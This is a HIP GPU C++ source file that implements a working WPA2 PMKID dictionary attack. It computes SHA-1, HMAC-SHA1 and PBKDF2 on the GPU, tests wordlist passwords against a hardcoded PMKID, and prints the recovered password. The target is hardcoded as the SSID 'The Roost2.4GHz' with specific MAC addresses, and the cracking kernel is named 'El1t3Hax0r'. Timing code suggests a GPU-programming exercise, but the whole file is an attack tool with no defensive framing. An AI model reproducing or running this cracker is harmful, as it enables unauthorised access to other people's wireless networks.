#include <cstdio>
#include <iostream>
#include <random>
#include <chrono>
#include <fstream>
#include <hip/hip_runtime.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>



 
/*************************** HEADER FILES ***************************/
#include <stdlib.h>
#include <memory.h>


//#define USE_SHA1 1


//#define CUDA_HASH 1
//#define OCL_HASH 0

typedef unsigned char BYTE;
typedef unsigned int  WORD;
typedef unsigned long long LONG;



////////////////////////////////////////////////////////////////////////////
//I decided not to implement SHA1 from scratch, but borrowed from //////////
//Scroll down to find where the beginning of my code is marked//////////////
////////////////////////////////////////////////////////////////////////////
//#define SHA1_BLOCK_SIZE 20              // SHA1 outputs a 20 byte digest


typedef struct {
	BYTE data[64];
	WORD datalen;
	unsigned long long bitlen;
	WORD state[5];
	WORD k[4];
} CUDA_SHA1_CTX;


#ifndef ROTLEFT
#define ROTLEFT(a,b) (((a) << (b)) | ((a) >> (32-(b))))
#endif


__device__  __forceinline__ void cuda_sha1_transform(CUDA_SHA1_CTX *ctx, const BYTE data[])
{
	WORD a, b, c, d, e, i, j, t, m[80];

	for (i = 0, j = 0; i < 16; ++i, j += 4)
		m[i] = (data[j] << 24) + (data[j + 1] << 16) + (data[j + 2] << 8) + (data[j + 3]);
	for ( ; i < 80; ++i) {
		m[i] = (m[i - 3] ^ m[i - 8] ^ m[i - 14] ^ m[i - 16]);
		m[i] = (m[i] << 1) | (m[i] >> 31);
	}

	a = ctx->state[0];
	b = ctx->state[1];
	c = ctx->state[2];
	d = ctx->state[3];
	e = ctx->state[4];

	for (i = 0; i < 20; ++i) {
		t = ROTLEFT(a, 5) + ((b & c) ^ (~b & d)) + e + ctx->k[0] + m[i];
		e = d;
		d = c;
		c = ROTLEFT(b, 30);
		b = a;
		a = t;
	}
	for ( ; i < 40; ++i) {
		t = ROTLEFT(a, 5) + (b ^ c ^ d) + e + ctx->k[1] + m[i];
		e = d;
		d = c;
		c = ROTLEFT(b, 30);
		b = a;
		a = t;
	}
	for ( ; i < 60; ++i) {
		t = ROTLEFT(a, 5) + ((b & c) ^ (b & d) ^ (c & d))  + e + ctx->k[2] + m[i];
		e = d;
		d = c;
		c = ROTLEFT(b, 30);
		b = a;
		a = t;
	}
	for ( ; i < 80; ++i) {
		t = ROTLEFT(a, 5) + (b ^ c ^ d) + e + ctx->k[3] + m[i];
		e = d;
		d = c;
		c = ROTLEFT(b, 30);
		b = a;
		a = t;
	}

	ctx->state[0] += a;
	ctx->state[1] += b;
	ctx->state[2] += c;
	ctx->state[3] += d;
	ctx->state[4] += e;
}

__device__ void cuda_sha1_init(CUDA_SHA1_CTX *ctx)
{
	ctx->datalen = 0;
	ctx->bitlen = 0;
	ctx->state[0] = 0x67452301;
	ctx->state[1] = 0xEFCDAB89;
	ctx->state[2] = 0x98BADCFE;
	ctx->state[3] = 0x10325476;
	ctx->state[4] = 0xc3d2e1f0;
	ctx->k[0] = 0x5a827999;
	ctx->k[1] = 0x6ed9eba1;
	ctx->k[2] = 0x8f1bbcdc;
	ctx->k[3] = 0xca62c1d6;
}

__device__ void cuda_sha1_update(CUDA_SHA1_CTX *ctx, const BYTE data[], size_t len)
{
	size_t i;

	for (i = 0; i < len; ++i) {
		ctx->data[ctx->datalen] = data[i];
		ctx->datalen++;
		if (ctx->datalen == 64) {
			cuda_sha1_transform(ctx, ctx->data);
			ctx->bitlen += 512;
			ctx->datalen = 0;
		}
	}
}

__device__ void cuda_sha1_final(CUDA_SHA1_CTX *ctx, BYTE hash[])
{
	WORD i;

	i = ctx->datalen;

	// Pad whatever data is left in the buffer.
	if (ctx->datalen < 56) {
		ctx->data[i++] = 0x80;
		while (i < 56)
			ctx->data[i++] = 0x00;
	}
	else {
		ctx->data[i++] = 0x80;
		while (i < 64)
			ctx->data[i++] = 0x00;
		cuda_sha1_transform(ctx, ctx->data);
		memset(ctx->data, 0, 56);
	}

	ctx->bitlen += ctx->datalen * 8;
	ctx->data[63] = ctx->bitlen;
	ctx->data[62] = ctx->bitlen >> 8;
	ctx->data[61] = ctx->bitlen >> 16;
	ctx->data[60] = ctx->bitlen >> 24;
	ctx->data[59] = ctx->bitlen >> 32;
	ctx->data[58] = ctx->bitlen >> 40;
	ctx->data[57] = ctx->bitlen >> 48;
	ctx->data[56] = ctx->bitlen >> 56;
	cuda_sha1_transform(ctx, ctx->data);

	for (i = 0; i < 4; ++i) {
		hash[i]      = (ctx->state[0] >> (24 - i * 8)) & 0x000000ff;
		hash[i + 4]  = (ctx->state[1] >> (24 - i * 8)) & 0x000000ff;
		hash[i + 8]  = (ctx->state[2] >> (24 - i * 8)) & 0x000000ff;
		hash[i + 12] = (ctx->state[3] >> (24 - i * 8)) & 0x000000ff;
		hash[i + 16] = (ctx->state[4] >> (24 - i * 8)) & 0x000000ff;
	}
}

__device__ void kernel_sha1_hash(BYTE* indata, WORD inlen, BYTE* outdata)
{

	BYTE* in = indata;
	BYTE* out = outdata;
	CUDA_SHA1_CTX ctx;
	cuda_sha1_init(&ctx);
	cuda_sha1_update(&ctx, in, inlen);
	cuda_sha1_final(&ctx, out);

}




//////////////////////////////////////////////////////////////////////////////////////
//THE REST IS MY CODE//
//////////////////////////////////////////////////////////////////////////////////////


__device__ void HMAC_SHA1(unsigned char *message, unsigned int message_length, unsigned char *K, unsigned int K_len, unsigned char *out){
	
	unsigned char whole[84]; //right_side is 120bit/20 byte and opad is 64 bytes
	unsigned char *right_side = (unsigned char*)malloc(64+message_length);
	
	for(int i=0; i<64; i++){
	
		if(i<K_len){
			//ipad[i] = K[i]^0x36;
			right_side[i]=K[i]^0x36;
			whole[i] = K[i]^0x5c;
		}
		else{
			right_side[i]=0x36;
			whole[i] = 0x5c;
		}
	}
	
	memcpy(right_side+64,message,message_length);
	kernel_sha1_hash(right_side, 64+message_length, whole+64);
	free(right_side);
	kernel_sha1_hash(whole, 84, out);


}

__device__ void PBKDF2(unsigned char *password, unsigned int password_len, unsigned char *SSID, unsigned int SSID_len, unsigned int iters, unsigned int key_len, unsigned char *out){

	
	unsigned char *T_chain = (unsigned char *)malloc(((key_len+160-1)/160)*20);
	memset(T_chain, 0, ((key_len+160-1)/160)*20);
	for(unsigned int i=0; i<(key_len+160-1)/160; i++){
		unsigned char U_prime[20];
		for(unsigned int c=0; c<iters; c++){
			if(c==0){
				unsigned char *SSID_2 = (unsigned char *)malloc(SSID_len + 4);
				memcpy(SSID_2,SSID,SSID_len);

				SSID_2[SSID_len] = ((i+1) >> 24) & 0xFF;
				SSID_2[SSID_len+1] = ((i+1) >> 16) & 0xFF;
				SSID_2[SSID_len+2] = ((i+1) >> 8) & 0xFF;
				SSID_2[SSID_len+3] = (i+1) & 0xFF;

				HMAC_SHA1(SSID_2, SSID_len+4, password, password_len, U_prime);
				free(SSID_2);
			}
			else{
				HMAC_SHA1(U_prime, 20, password, password_len, U_prime);
			}
			for(unsigned int bytes=0; bytes<20; bytes++){
				T_chain[i*20 + bytes] = T_chain[i*20+bytes]^ U_prime[bytes];
			}
		}

	}
	memcpy(out, T_chain, key_len/8);
	free(T_chain);


}


__device__ bool eq_checker(unsigned char *str1, unsigned char *str2, unsigned int str_len){
	for(unsigned int i=0; i<str_len; i++){
		if(str1[i]!=str2[i]){
			return false;	
		}
	}
	return true;
}


__device__ bool PMKID(unsigned char *password, unsigned int password_len, unsigned int SSID_len, unsigned char *PMK_info){
	unsigned char PMK[32];
	
	PBKDF2(password, password_len, PMK_info+20+16, SSID_len, 4096, 256, PMK);
	HMAC_SHA1(PMK_info,20,PMK,32,PMK);
	return eq_checker(PMK,PMK_info+20,16);

	
}

__global__ void El1t3Hax0r(unsigned char *true_PMKID, unsigned char *password, unsigned int password_len, unsigned int buff_pop, unsigned char *SSID, unsigned int SSID_len, unsigned char *PMK_info, unsigned char *out, bool *found){
	int tid = threadIdx.x;
	int bid = blockIdx.x;
	int tpb = blockDim.x;
	int global_tid = tpb*bid+tid;
	extern __shared__ unsigned char shPMK_info[];

	if(tid == 0){	
		memcpy(shPMK_info,PMK_info,20);
	}
	if(tid==1){
		memcpy(shPMK_info+20,true_PMKID,16);
	}
	if(tid==2){
		memcpy(shPMK_info+20+16,SSID,SSID_len);
	}
	__syncthreads();

	

	if(global_tid<(buff_pop/(password_len+1))){
		unsigned char local_password[8];
		memcpy(local_password, password+(global_tid*(password_len+1)),8);

		if(PMKID(local_password, password_len, SSID_len, shPMK_info)){
			memcpy(out,local_password,password_len);	
			*found = true;
		}
	}
}



int main(int argc, char *argv[]){
	//cudaThreadSetLimit(cudaLimitMallocHeapSize, 128*1024*1024);
	hipEvent_t start;
	hipEvent_t stop;
	hipEventCreate(&start);
	hipEventCreate(&stop);

	unsigned int threads_per_block = std::stoi(argv[1]); //read in threads per block
	char *password_file = argv[2]; // read in name of password file, either generated_big.txt or generated_small.txt
	size_t buff_size = std::stoi(argv[3]); //how much of the file to read in at once in bytes

	unsigned char out[8] = {'\0'};
	unsigned char PMKID[] = {0x1a, 0x24, 0x31, 0x51, 0x78, 0x04, 0x69, 0x53, 0xda, 0xfe, 0xd3, 0xd6, 0xe6, 0x29, 0x5b, 0xb7};
	unsigned char SSID[] = "The Roost2.4GHz";
	unsigned int SSID_len = strlen((char *)SSID);
	unsigned char AP_MAC[] = {0x36, 0x96, 0x01, 0x44, 0x4d, 0xe9};
	unsigned char S_MAC[] = {0x9c, 0x4e, 0x36, 0xb5, 0x43, 0xf8};

	unsigned char PMK_info[20];
	unsigned char PMK_name[] = "PMK Name";
		
	memcpy(PMK_info,PMK_name,8);
	memcpy(PMK_info+8, AP_MAC, 6);
	memcpy(PMK_info+14, S_MAC, 6);
	
	bool *found, *dFound;
	hipHostAlloc(&found,sizeof(bool),hipHostMallocDefault);
	hipMalloc((bool **)&dFound,sizeof(bool));
	*found = false;
	hipMemcpy(dFound,found,sizeof(bool), hipMemcpyHostToDevice);

	//reading in file in chunks
	//char *buff = new char[buff_size];
	char *buff;
	hipHostMalloc((void**)&buff, buff_size, hipHostMallocDefault);
	std::ifstream fin(password_file);
	
	unsigned char *dTrue_PMKID,*dSSID,*dPMK_info, *dOut;
	hipMalloc((unsigned char**)&dTrue_PMKID, 16);
	hipMalloc((unsigned char**)&dSSID, sizeof(unsigned char)*SSID_len);
	//cudaMalloc((unsigned char**)&dS_MAC, sizeof(unsigned char)*6);
	//cudaMalloc((unsigned char**)&dAP_MAC, sizeof(unsigned char)*6);
	hipMalloc((unsigned char**)&dPMK_info, sizeof(unsigned char)*20);
	hipMalloc((unsigned char**)&dOut, sizeof(unsigned char)*9);

	unsigned char *dPassword;
	hipMalloc((unsigned char**)&dPassword,buff_size);

	hipMemcpy(dTrue_PMKID,PMKID,16,hipMemcpyHostToDevice);
	hipMemcpy(dPassword,buff,buff_size,hipMemcpyHostToDevice);
	hipMemcpy(dSSID,SSID,sizeof(unsigned char)*SSID_len,hipMemcpyHostToDevice);
	//cudaMemcpy(dS_MAC,S_MAC,sizeof(unsigned char)*6,cudaMemcpyHostToDevice);
	//cudaMemcpy(dAP_MAC,AP_MAC,sizeof(unsigned char)*6,cudaMemcpyHostToDevice);
	hipMemcpy(dPMK_info,PMK_info,sizeof(unsigned char)*20,hipMemcpyHostToDevice);
	
	float ms=0;
	while(fin){
		// Try to read next chunk of data
		fin.read(buff, buff_size);

		// Get the number of bytes actually read
		size_t count = fin.gcount();
		// If nothing has been read, break
		if (count<9) //not a full password so we break 
			break;
		//Do what you need with the buffer
		//Here we need to call the function to generate PMKIDs against each password in buff

		hipMemcpy(dPassword,buff,count,hipMemcpyHostToDevice);

		hipEventRecord(start);
		El1t3Hax0r<<<((count/9)+threads_per_block-1)/threads_per_block,threads_per_block, (20+16+SSID_len)*sizeof(unsigned char)>>>(dTrue_PMKID,dPassword,8,count,dSSID,SSID_len,dPMK_info,dOut,dFound);
		hipDeviceSynchronize();
		hipEventRecord(stop);        
		hipEventSynchronize(stop);
		float ms_temp;
		hipEventElapsedTime(&ms_temp,start,stop);
		ms += ms_temp;
		
		hipMemcpy(found,dFound,sizeof(bool), hipMemcpyDeviceToHost);
		if(*found){
			hipMemcpy(out,dOut,8,hipMemcpyDeviceToHost);
			break;
		}
	}

	hipFree(dTrue_PMKID);		
	hipFree(dPassword);
	hipFree(dSSID);
	//cudaFree(dS_MAC);
	//cudaFree(dAP_MAC);
	hipFree(dPMK_info);
	hipFree(dOut);
	hipFree(dFound);
	hipFree(buff);

	printf("The password is: ");
	for(int i=0; i<8; i++){
		printf("%c", out[i]);
	}
	printf("\n");
	printf("Total time taken on GPU: %f\n", ms);

	return 0;
}
